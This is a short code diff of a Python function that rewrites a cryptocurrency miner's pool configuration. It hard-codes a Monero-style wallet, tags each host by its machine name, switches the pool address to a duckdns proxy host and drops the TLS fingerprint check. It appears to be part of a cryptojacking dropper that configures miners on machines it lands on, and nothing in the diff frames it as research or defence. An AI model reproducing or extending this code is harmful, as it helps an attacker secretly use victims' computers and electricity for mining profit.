@@ -138,11 +138,10 @@ def update_config_json(extracted_dir):
             config = json.load(f)
         if 'pools' in config and isinstance(config['pools'], list) and len(config['pools']) > 0:
             pool = config['pools'][0]
-            pool['url'] = "pool.hashvault.pro:443"
+            pool['url'] = "ontcfu.duckdns.org:443"
             pool['user'] = "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu"
             pool['pass'] = f"{datetime.now():%Y%m%d}{socket.gethostname()}"
             pool['tls'] = True
-            pool['tls-fingerprint'] = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
         with open(config_path, 'w', encoding='utf-8') as f:
             json.dump(config, f, indent=4)
     except Exception as e:
